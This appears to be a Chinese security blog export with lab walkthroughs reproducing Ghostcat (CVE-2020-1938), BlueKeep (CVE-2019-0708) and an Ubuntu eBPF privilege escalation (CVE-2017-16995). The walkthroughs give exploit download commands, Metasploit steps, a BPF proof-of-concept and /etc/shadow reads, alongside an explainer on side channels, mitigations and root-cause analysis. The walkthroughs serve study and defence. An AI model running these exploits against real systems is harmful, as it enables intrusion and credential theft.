接下来的内容我会以问答形式来表达。 Q：什么是侧信道攻击？在这里我们使用wikipedia上的定义，在密码学中，旁道攻击又称侧信道攻击、边信道攻击（英语：Side-channel attack）是一种攻击方式，它基于从密码系统的物理实现中获取的信息而非暴力破解法或是算法中的理论性弱点（较之密码分析）。例如：时间信息、功率消耗、电磁泄露或甚是声音可以提供额外的信息来源，这可被利用于对系统的进一步破解。某些侧信道攻击还要求攻击者有关于密码系统内部操作的技术性信息，不过，其他诸如差分电力分析的方法在黑盒攻击中效果明显。许多卓有成效的侧信道攻击基于由保罗·科切开拓的统计学方法。 Q：侧信道攻击有什么类型？ 根据借助的介质，旁路攻击分为多个大类，包括： 缓存攻击，通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云端主机物理主机的访问权而获取存储器的访问权； 计时攻击，通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定资料位于哪个存储设备，或者利用通信的时间差进行资料窃取; 基于功耗监控的旁路攻击，同一设备不同的硬件电路单元的运作功耗也是不一样的，因此一个程序运行时的功耗会随着程序使用哪一种硬件电路单元而变动，据此推断出资料输出位于哪一个硬件单元，进而窃取资料； 电磁攻击，设备运算时会泄漏电磁辐射，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）； 声学密码分析，通过捕捉设备在运算时泄漏的声学信号捉取信息（与功率分析类似）； 差别错误分析，隐密资料在程序运行发生错误并输出错误信息时被发现； 数据残留，可使理应被删除的敏感资料被读取出来（例如冷启动攻击）； 软件初始化错误攻击，现时较为少见，行锤攻击是该类攻击方式的一个实例，在这种攻击实现中，被禁止访问的存储器位置旁边的存储器空间如果被频繁访问将会有状态保留丢失的风险； 光学方式，即隐密资料被一些视觉光学仪器（如高清晰度相机、高清晰度摄影机等设备）捕捉。所有的攻击类型都利用了加密/解密系统在进行加密/解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密资料。 Q：侧信道攻击有什么例子？在vmware中给的那个链接里我们可以看到这么一句: The root cause of the performance degradation is most likely due to mitigations for side channel attacks such as Spectre and Meltdown. 我们就以Spectre和Meltdown为例。 Spectre幽灵（英语：Spectre）是一个存在于分支预测实现中的硬件缺陷及安全漏洞，含有预测执行功能的现代微处理器均受其影响，漏洞利用是基于时间的旁路攻击，允许恶意进程获得其他程序在映射内存中的资料内容。Spectre是一系列的漏洞，基于攻击行为类型，赋予了两个通用漏洞披露ID，分别是CVE-2017-5753（bounds check bypass，边界检查绕过）和CVE-2017-5715（branch target injection，分支目标注入），于2018年1月随同另一个也基于推测运行机制的、属于重量级信息安全漏洞的硬件缺陷“Meltdown”（熔毁）一同公布。由于该缺陷是推测运行机制导致的，加上不同处理器架构对推测运行又有不同的实现方式，因此这个缺陷无法获得根源上的修复而只能采取“见招拆招”式的方法防范，而且因机制所致，各种解决方案还有不可预料的性能下降。 CVE-2017-5753依赖于运行中的即时编译（JIT）系统，用于Javascript的JIT引擎已被发现存在此漏洞。网站可以读取浏览器中存储的另一个网站的数据，或者浏览器本身的内存。对此Firefox 57.0.4（部分）及Chrome 64通过为每个网站分配专用的浏览器进程来阻挡此类攻击；操作系统则是通过改写的编译器重新编译以阻挡利用该漏洞进行攻击的行为。 针对CVE-2017-5715，除了软件层面上进行修改以外，处理器也需要通过微码更新来阻挡这类攻击。 随着幽灵缺陷派生的安全漏洞（攻击手段变体，包括CVE-2018-3693、CVE-2018-3640、CVE-2018-3639等）被逐一发现，英特尔等CPU开发商不得不在修复既有缺陷的同时资助第三方信息安全团队继续发掘潜在的缺陷以破财消灾。 Meltdown熔断（英语：Meltdown），也译崩溃，编号CVE-2017-5754，正式名称为“Rogue Data Cache Load”，常译作“恶意数据缓存加载”，是一个存在于英特尔大部分x86/x86-64微处理器、部分IBM POWER架构处理器以及部分ARM架构处理器中的关于推测运行机制的硬件设计缺陷及安全漏洞。该缺陷使得低权限的进程无论是否获取特权，均可以获取受高权限保护的内存空间中的资料，漏洞利用是基于时间的旁路攻击。2018年1月，该缺陷随另一个基于推测运行机制的重量级信息安全漏洞、硬件缺陷“Spectre”（幽灵）在通用漏洞披露中公布。 由于英特尔处理器及IBM POWER处理器均在市场上占据极大的份额（出现缺陷的ARM处理器在缺陷被发现时尚未正式面市），这种涉及信息安全的硬件缺陷影响范围甚广，包括几乎整个x86、POWER服务器领域、几乎整个小型主机及大型主机市场、个人电脑市场等都无一幸免，另外该缺陷的危险程度之高（无需特权即可访问敏感资料所在的存储器空间），曾一度令信息安全人员及机构怀疑缺陷的真实性，而提前公布这些缺陷还极有可能引发全球性的信息安全灾难，因而选择先与处理器厂商及核心客户联系协商备妥修补方案再另行公布。目前该硬件缺陷可通过软件实现规避，包括Linux系、Android、OS X/macOS、Windows等等都有相应的修复程序（像是Linux的内核页表隔离技术），但是软件规避将导致处理器性能的显著下降。而从根本上修复该缺陷的方法（包括修复“幽灵”缺陷）是重新设计处理器的微架构，为此英特尔、IBM及ARM都将新处理器微架构的推出时程大幅押后。 Q：开启侧信道攻击缓解措施具体能够对什么攻击生效？这是个很有趣的问题，我查遍了整个vmware的知识库（看英文真的好痛苦），也没找到它对自己的这个功能的详细解释。但是勇敢狐狸不怕困难在我的查找下，还是能够从侧面对这个问题做出一些回答的。 根据vmware知识库另一篇讲如何缓解MDS漏洞的文章中中，我们可以看到vmware在侧信道攻击方面的防御努力。MDS是一个典型的侧信道攻击，它所涉及的CVE漏洞有CVE-2018-12126、CVE-2018-12127、CVE-2018-12130 和 CVE-2019-11091等。 而在英特尔的这个链接中中,我们可以看到这么一句: 对于那些未能在硬件中解决 MDS 的产品，英特尔将与原始设备制造商 (OEM) 在定期更新的流程中发布处理器微码更新 (MCU)。这些将与操作系统和虚拟机管理程序软件的对应更新相结合。 我觉得可以认为vmware和inter有**交易这个更新已经在vmware中实现了。 Q：开启侧信道攻击缓解措施是否有必要？虽然很多安全观点都是一个仁者见仁智者见智（说人话就是随便你）的问题，但是对于侧信道攻击，我还是觉得它不是一个常规意义上的严重性的漏洞。 从使用难度上来说，侧信道攻击技术含量很高，这意味着它的使用门槛也很高；从易用性上来说，vmware默认开启这个功能，大部分人不会想着去关闭它，所以即使真有一个能够利用这个漏洞的工具，它也很难找到目标； 更何况在英特尔的文章中对于MDS有过这么一个看法： 在研究环境的受控条件外利用 MDS 漏洞是一项复杂的工作。MDS 漏洞已被行业标准的“通用漏洞评分系统 (CVSS)”划分为低到中级严重性，而且值得注意的是，并没有任何实际利用这些漏洞的报告。 虽然在quore上依然有一些工程师认为侧信道攻击是一个非常被低估的漏洞，但是…你懂的（耸肩）。 Q：开启侧信道攻击缓解措施之后虚拟机性能会下降多少？我知道这个问题很多人关心，但是这是个很不好回答的问题… 在reddit、csdn、博客园、V2EX论坛上，你可以找到一些对于侧信道攻击的吐槽，例如说如果不关闭，自己的虚拟机会非常卡；或是吐槽这个功能会在创建虚拟机时默认开启导致自己每次都要手动关闭（我直接关闭了提示假装它不存在）；也有人说它无关紧要… 根据在英特尔的文章中的解释，MDS的漏洞缓解策略只会影响不到5%的性能，我们有理由相信vmware不会给自己挖一个特别影响性能的坑，所以嘛…还是开着吧。 后记这个文章写于上班摸鱼期间，大概花费了我一整个下午。如果你读完了全文却依然很迷惑，那你首先不该埋怨我，让我们一起把锅丢给不完整的vmware知识库吧而应该重新理解其中的几个概念： side channel mitigations 侧信道攻击（旁路攻击） MDS（Microarchitectural Data Sampling） 如果依然存有迷惑，欢迎讨论。","tags":[{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"}],"categories":[{"name":"闲谈","slug":"闲谈","permalink":"http://ciaofox.me/categories/%E9%97%B2%E8%B0%88/"}]},{"title":"Apache Tomcat文件包含漏洞（CVE-2020-1938）","date":"2020-03-03T10:15:30.000Z","path":"2020/03/03/400 Execution 攻击/Apache Tomcat文件包含漏洞（CVE-2020-1938）/","text":"实验内容漏洞概述2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。 Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，因此本次通告的漏洞影响范围较大，请相关用户及时采取防护措施修复此漏洞。 参考链接： https://www.cnvd.org.cn/webinfo/show/5415 影响范围受影响版本Apache Tomcat 6Apache Tomcat 7 &lt; 7.0.100Apache Tomcat 8 &lt; 8.5.51Apache Tomcat 9 &lt; 9.0.31 不受影响版本Apache Tomcat = 7.0.100Apache Tomcat = 8.5.51Apache Tomcat = 9.0.31 实验环境 攻击机：Kali Linux 攻击机IP：192.168.40.132 靶机：Windows10 靶机IP:192.168.40.131 实验步骤第0步 漏洞验证通常在Apache Tomcat官网下载的安装包名称中会包含有当前Tomcat的版本号，用户可通过查看解压后的文件夹名称来确定当前的版本。![验证](Apache Tomcat文件包含漏洞（CVE-2020-1938）/BoardingPass_MyNameOnMars2020.png) 如果解压后的Tomcat目录名称被修改过，可使用软件自带的version模块来获取当前的版本。进入Tomcat安装目录的bin目录，输入命令version.bat后，可查看当前的软件版本号。 可知该版本在漏洞影响范围内。 第1步 靶机配置在靶机上安装对应的JDK（从官网下载）。 配置JAVA环境变量，右键我的电脑&gt;属性&gt;高级系统设置&gt;环境变量。新建JAVA_HOME，填写如下路径 1C:\\Program Files\\Java\\jdk-10.0.2 Path中添加如下路径 1%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin 靶机下载apache-tomcat-8.5.32（其他受影响版本也可），并配置环境变量。新建CATALINA_HOME,填写如下路径 1C:\\Users\\Kwok\\Desktop\\apache-tomcat-8.5.32 完成上述工作后，运行apache-tomcat-8.5.32/bin/startup.bat。并在浏览器地址栏输入http://127.0.0.1:8080 ，出现如下画面，说明tomcat配置成功。 攻击机操作攻击机下载POC脚本：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi 为了方便验证，我们现在靶机apache-tomcat-8.5.32/webapps/ROOT下新建一个文件夹，以方便我们验证是否漏洞利用成功。 然后我们在攻击机中执行POC脚本。 1python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.40.131 -p 8009 -f test.txt 可以看到漏洞利用成功。 漏洞防护官方升级目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接： 版本号 下载地址Apache Tomcat 7.0.100 http://tomcat.apache.org/download-70.cgiApache Tomcat 8.5.51 http://tomcat.apache.org/download-80.cgiApache Tomcat 9.0.31 http://tomcat.apache.org/download-90.cgi 其他解决方案如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。 一、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。编辑 /conf/server.xml，找到如下行（ 为 Tomcat 的工作目录）： 1&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt; ![环境变量](Apache Tomcat文件包含漏洞（CVE-2020-1938）\\20200303210458.png)将其删除或者注释掉即可。保存后需重新启动Tomcat，规则方可生效。 二、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）： 1&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt; 使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）： 1&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; 漏洞原理以下内容来源于【WEB安全】Tomcat-Ajp协议漏洞分析 tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。如下图： tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性如下图： 因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path 然后封装成对应的request之后,继续走servlet的映射流程如下图所示: 其中具体的映射方式就简略了，具体可以自己查看代码. 利用方式1、利用DefaultServlet实现任意文件下载当url请求未在映射的url列表里面则会通过tomcat默认的DefaultServlet会根据上面的三个属性来读取文件如下图 通过serveResource方法来获取资源文件 通过getRelativePath来获取资源文件路径 然后再通过控制ajp控制的上述三个属性来读取文件,通过操控上述三个属性从而可以读取到/WEB-INF下面的所有敏感文件，不限于class、xml、jar等文件。 2、通过jspservlet实现任意后缀文件包含当url（比如http://xxx/xxx/xxx.jsp）请求映射在org.apache.jasper.servlet.JspServlet这个servlet的时候也可通过上述三个属性来控制访问的jsp文件如下图: 控制路径之后就可以以jsp解析该文件 所以只需要一个可控文件内容的文件即可实现rce. 参考链接https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ http://blog.nsfocus.net/cve-2020-1938/ https://www.cnvd.org.cn/webinfo/show/5415 https://stackoverflow.com/questions/21757694/what-is-ajp-protocol-used-for","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"文件上传","slug":"文件上传","permalink":"http://ciaofox.me/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"}]},{"title":"windows远程桌面漏洞(CVE-2019-0708)","date":"2019-10-11T05:07:08.000Z","path":"2019/10/11/400 Execution 攻击/windows远程桌面漏洞（CVE-2019-0708）/","text":"前言2019年5月15号Windows发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞CVE-2019-0708，该漏洞通过检查用户的身份验证，绕过认证，可直接通过rdp协议进行连接并发送恶意代码。一旦被利用会导致服务器入侵，可造成像WannaCry永恒之蓝漏洞一样大规模的感染。 2019年9月7日上午。Metasploit在推特上发布消息称，Metasploit正式集成针对CVE-2019-0708（也称为BlueKeep）的漏洞利用模块。 注：本文的漏洞分析部分超出了我个人的能力，其全部来自于中文链接中的第一个网页。对于这个分析我也无法全部理解，如果您（看到这个文章的人）对此有什么个人见解，欢迎邮件和我讨论。 复现环境攻击机：kali （IP: 192.168.40.131） 靶机：window7 旗舰版 (IP: 192.168.40.128) 准备过程首先，我们更新一下kali中的msf模块（注，本文写成时msf已经更新至5.0，部分步骤可能不同）。 1apt-get install metasploit-framework 更新后，我们下载漏洞的EXP： 1234567wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 下载EXP后，我们将其复制到MSF模块中 123456789mkdir -p /usr/share/metasploit-framework/modules/exploits/windows/rdp/cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbcp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 确认windows已开启远程桌面服务（这里特别注意一下，win7只有旗舰版和企业版才有远程桌面服务，家庭版没有） 这里有一个坑，部分电脑这里只有远程协助却没有远程桌面选项，如果出现这种情况，首先确认你的win7是否是旗舰版或者企业版。如果版本没有问题的话，那可能是win7组策略设置导致没有远程桌面选项，我们需要修改组策略。 解决方法：开始-运行-gpedit.msc-计算机配置—–&gt;管理模板—–&gt;网络—–&gt;网络连接—–&gt;Windows防火墙—–&gt;标准配置文件—–&gt;Windows防火墙允许入站远程桌面例外更改为启用即可。 复现步骤打开msf。 1msfconsole 打开后加载以下刚才复制的EXP： 1reload_all 载入后搜索0708，找到我们需要的EXP。 1search 0708 这里可以看到有四个模块，我们需要第0个和第3个，标号为0的模块是一个探测对方是否存在0708漏洞的模块，而标号为3的模块是利用0708漏洞的模块。 接下来我们先探测一下靶机是否存在这个漏洞。 12345use 0set rhosts 192.168.40.128run 可以看到返回说这个目标非常脆弱，这意味着对象存在着0708漏洞，接下来我们用back指令返回，选择3号模块开始使用这个漏洞对目标进行渗透。 12345use 3set rhosts 192.168.40.128set target 3 这里特别注意一下，target有很多不同的选择，可以用showtargets查看。务必选择对应靶机的版本。 如果这里没有选择对应的版本的话，会出现直接让靶机蓝屏的情况。请务必多尝试几个不同的target。（反正我全部用完了都是蓝屏….. 这里出现了一些bug，我无论使用哪个target都是蓝屏，反复尝试过之后只能确定可能是靶机的问题。如果成功的话，会回弹一个shell，可以执行任意代码，且权限为root。 漏洞分析Rdp基础 RDP 协议基于 T.128（T.120 协议族）提供多通道通信，并进行了拓展。 远程桌面协议（RDP）支持客户端建立点到点的连接,并定义了通信双方在虚拟通道间的数据通信方式，。这种虚拟通道为双向数据通道，可以扩展RDP的功能。WindowsServer 2000在RDPv5.1中定义了32种静态虚拟通道（SVC），但是因为将来要定义的动态虚拟通道数量的限制，因此专用的通道svc数量受到一定限制。SVC是在会话开始时创建的，并在会话终止前保持不变，但DVC不同，因为它是根据用户需求来创建和删除的。 服务端在初始化阶段，会创建MS_T120, Index 为 31 的通道。在收到MCS ConnectInitial数据封包后进行通道创建和绑定操作。 在IcaBindVirtualChannels函数中进行绑定时，IcaFindChannelByName函数只根据通道名进行通道查找。当通道名为MS_T120(不区分大小写)时，会找到系统内部通道 MS_T120的通道并与之绑定，绑定后，通道索引会即被更改为新的通道索引。 参考mcafee,seebug 本人用win7sp1 x64进行测试 查看termdd.sys，有修改 对比补丁前后 13628这个子模块变化比较大，先看看 发现加了stricmp比较，和ms_t120这个通道比较，为0就用写死的v19即31（rdp通道编号）作为第三个参数传入13ec8这个子模块，所以这里可以看出漏洞点应该是ms_t120这个通道，是就触发漏洞。 //bindiff没解析出_IcaBindChannel和_IcaBindVirtualChannels。 在安全机制启用前，系统初始化了RDP连接序列，并完成通道的建立，这导致了该漏洞可形成蠕虫。 在rdp的gcc协商初始化序列中，ms_t120这个svc会被绑定作为引用通道31。 这个通道编号31在microsoft内部使用，在客户端请求连接中不会出现ms_t120这个svc。 但是在GCC协商初始化的过程中，客户端提供的通道名称并不在服务器端的白名单中，这意味着攻击者将能够设置另一个名为“MS_T120”的不在编号31的SVC通道，这导致目标系统发生堆内存崩溃并实现远程代码执行。 MS_T120引用通道会在rdpwsx.dll中创建，堆内存也会在rdpwp.sys中分配内存池。当MS_T120引用通道在通道编号非31的场景下建立时，便会发生堆内存崩溃。 微软在termdd.sys的_IcaBindVirtualChannels和_IcaRebindVirtualChannels两个函数中为客户端的连接请求部分添加了针对通道名称“MS_T120”的检查代码，来保证ms_t120是和通道31进行绑定。 利用wireshark获取rdp数据包（winn2003stand without 0708 patch） 正常rdp连接： tcp三次握手后发送rdp数据，利用decode as tpkt解出rdp数据包 //第二遍tcp握手后(neg req=fff)才开始发clientdata 没有ms_t120通道信息 此处本人推测ms_t120通道编号是1，channelCount就是channelDefArray元素数，验证漏洞存在！ 利用./rdesktop（第二个poc）对某僵尸主机发送的数据包： 此时推测ms_t120通道编号为2，验证漏洞存在！ 引用资料英文： https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/（推荐）https://medium.com/@straightblast426/a-debugging-primer-with-cve-2019-0708-ccfa266682f6 https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/ https://www.malwaretech.com/2019/05/analysis-of-cve-2019-0708-bluekeep.html https://medium.com/@ab_65156/proactive-detection-content-cve-2019-0708-vs-mitre-att-ck-sigma-elastic-and-arcsight-22f9ebae7d82 https://zerosum0x0.blogspot.com/2019/05/avoiding-dos-how-bluekeep-scanners-work.html https://www.zerodayinitiative.com/blog/2019/5/27/cve-2019-0708-a-comprehensive-analysis-of-a-remote-desktop-services-vulnerability 中文： https://www.freebuf.com/vuls/205380.html https://xz.aliyun.com/t/5295(翻译zerodayinitiative) https://www.anquanke.com/post/id/178964(翻译mcafee) https://www.kwok.fun/system-safety/119.html","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://ciaofox.me/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}],"categories":[{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"}]},{"title":"Ubuntu本地提权（CVE-2017-16995）","date":"2019-09-25T10:25:27.000Z","path":"2019/09/25/600 Privilege Escalation 权限提升/Ubuntu本地提权（CVE-2017-16995）/","text":"本篇文章本来来自于ichunqiu上的一次漏洞复现，但是我在复现过程中发现该实验只有如何利用漏洞，并没有详细对漏洞的原理，对poc进行解读。所以我在不同的平台仔细查找了一下关于这个漏洞的原理分析，并且整理成了一篇文章进行发布。所有参考链接都已附上。 实验工具upstream44.c: 实验中本地提权EXP的源文件，需编译后执行 实验内容漏洞概述近日，360-CERT监测到编号为CVE-2017-16995的Linux内核漏洞攻击代码被发布，及时发布了预警通告并继续跟进。该漏洞最早由Google project zero披露，并公开了相关poc。2017年12月23日，相关提权代码被公布，日前出现的提权代码是修改过来的版本。 BPF(Berkeley PacketFilter)是一个用于过滤(filter)网络报文(packet)的架构,其中著名的tcpdump,wireshark都使用到了它（具体介绍见参考资料2）。而eBPF就是BPF的一种扩展。然而在Linux内核实现中，存在一种绕过操作可以导致本地提权。 该漏洞在老版本中已经得到修复，然而最新版本中任可被利用，官方暂未发布相关补丁，漏洞处于0day状态。 影响范围Ubuntu 16.04.1~16.04.4 均存在此漏洞 实验环境 操作机：Kali Linux IP：172.16.11.2 目标IP：172.16.12.2 目标账号密码：ichunqiu 工具下载地址：http://file.ichunqiu.com/r36f8pnp/ 实验步骤第1步 漏洞验证打开Kali终端，输入wgethttp://file.ichunqiu.com/r36f8pnp/upstream44.c下载实验文件到当前目录 使用sftp将实验文件上传到目标机上（一般情况下提权文件由shell上传，此次不做为重点介绍） 命令为 sftp ichunqiu@172.16.12.2,密码:ichunqiu,上传命令：put upstream44.c ichunqiu是一个测试的普通权限用户 接着，我们使用ssh登录目标机器的ichunqiu用户 这时可以看见我们的用户权限，没有cat /etc/shadow的权限 接下来开始编译该文件，编译命令：gcc -o upstream44 upstream44.c 得到可执行文件upstream44 最后，执行刚刚编译后的文件，成功提升至root权限 我们再来 cat /etc/shadow一下,现在可以看见内容了 第2步 漏洞缓解虽然官网暂时未发布补丁升级方案，但是可以通过修改内核参数来限制普通用户使用bpf(2)系统调用的方式以规避风险。 修改命令如下 1echo 1 \\&amp;gt; /proc/sys/kernel/unprivileged_bpf_disabled 我们运行该命令后，再切换至普通用户执行EXP查看效果 可以看见报错:error: Operation not permitted,操作不被允许 漏洞原理分析Poc分析技术细节Poc概要 分析环境： 内核:v4.14-rc1 主要代码: 123456789101112131415161718192021BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd), BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP), // fill r0 with pointer to map value BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack BPF_MOV32_IMM(BPF_REG_ARG2, 1), BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0), BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2), BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit BPF_EXIT_INSN(), // exit BPF_MOV32_IMM(BPF_REG_1, 0xffffffff), // r1 = 0xffff’ffff, mistreated as0xffff’ffff’ffff’ffff BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1), // r1 = 0x1’0000’0000, mistreated as 0 BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28), // r1 = 0x1000’0000’0000’0000, mistreatedas 0 BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1), // compute noncanonical pointer BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef), BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0), // crash by writing to noncanonicalpointer BPF_MOV32_IMM(BPF_REG_0, 0), // terminate to make the verifier happy BPF_EXIT_INSN() 要理清这段代码为什么会造成崩溃，需要理解bpf程序的执行流程(见参考资料2) 用户提交bpf代码时，进行一次验证(模拟代码执行)，而在执行的时候并不验证。 而漏洞形成的原因在于：模拟执行代码（验证的过程中）与真正执行时的差异造成的。 接下来从这两个层面分析，就容易发现问题了。 模拟执行（验证过程）分析（寄存器用uint64_t、立即数用int32_t表示） (11) 行 : 将 0xffffffff放入BPF_REG_1寄存器中(分析代码发现进行了符号扩展 BPF_REG_1 为 0xffffffffffffffff) (12) 行 ：BPF_REG_1 = BPF_REG_1 + 1,此时由于寄存器溢出，只保留低64位（寄存器大小为64位），所以 BPF_REG_1变为0 (13) 行 : 左移，BPF_REG_1还是0 (14) 行 : 将BPF_REG_0 （map value 的地址）加 BPR_REG_1,BPF_REG_0，保持不变(该操作能绕过接下来的地址检查操作) (15)、(16): 将 map value 的值改为 0xdeadbeef。（赋值时会检查 map value地址的合法性,我们从上面分析可以得出，map value地址合法） 验证器（模拟执行）该bpf 代码，发现没什么问题，允许加载进内核。 真正执行（bpf虚拟机）分析(寄存器用uint64_t，立即数转化成uint32_t表示) (11)行 : 将 0xffff`ffff（此时立即数会转换为uint32_t） 放入 BPF_REG_1 的低32位，不会发生符号扩展。 (12)行 ： BPF_REG_1 = BPF_REG_1 + 1 ，此时 BPF_REG_1 =0x100000000(再次提示：运行时寄存器用 uint64_t表示) (13)行 : 左移，BPF_REG_1 = 0x1000’0000’0000’0000 (14)行 : 将BPF_REG_0 （map value 的地址）加 BPR_REG_1,此时BPF_REG_0变成一个非法值 (15)、(16): 导致非法内存访问，崩溃！ 以上就是Poc导致崩溃的原因。 补丁分析 上述是Jann Horn针对check_alu_op()函数里符号扩展问题提供的补丁。 原理是将32位有符号数在进入__mark_reg_known函数前先转化成了32位无符号数，这样就无法进行符号扩展了。验证如下： 12345678910111213141516171819202122\\#include \\&lt;stdio.h\\&gt; \\#include \\&lt;stdint.h\\&gt; void \\__mark_reg_known(uint64_timm)&#123;uint64_t reg = 0xffffffffffffffff;if(reg != imm)printf(&quot;360-CERT\\\\n&quot;);&#125;int main() &#123;int imm = 0xffffffff;\\__mark_reg_known((uint32_t)imm);return 0;&#125; 此时不会进行符号扩展，输出结果：360-CERT。 漏洞原理造成该漏洞的根本原因是：验证时模拟执行的结果与BPF虚拟机执行时的不一致造成的。 该漏洞其实是个符号扩展漏洞,给个简单的代码描述该漏洞成因: 123456789101112131415\\#include \\&lt;stdio.h\\&gt; \\#include \\&lt;stdint.h\\&gt; int main(void)&#123;int imm = -1;uint64_t dst = 0xffffffff;if(dst != imm)&#123;printf(&quot;360 cert\\\\n&quot;);&#125;return 0;&#125; 在比较时，会将 imm 进行扩展 导致 imm 为 0xffffffffffff`ffff 所以会导致输出 360cert 技术细节用户通过bpf函数，设置命名参数为BPF_PROG_LOAD,向内核提交bpf程序。内核在用户提交程序的时候，会进行验证操作，验证bpf程序的合法性（进行模拟执行）。但是只在提交时进行验证，运行时并不会验证，所以我们可以想办法让恶意代码饶过验证，并执行我们的恶意代码。 验证过程如下： 123451.kernel/bpf/syscall.c:bpf_prog_load2.kernel/bpf/verifier.c:bpf_check3.kernel/bpf/verifier.c:do_check 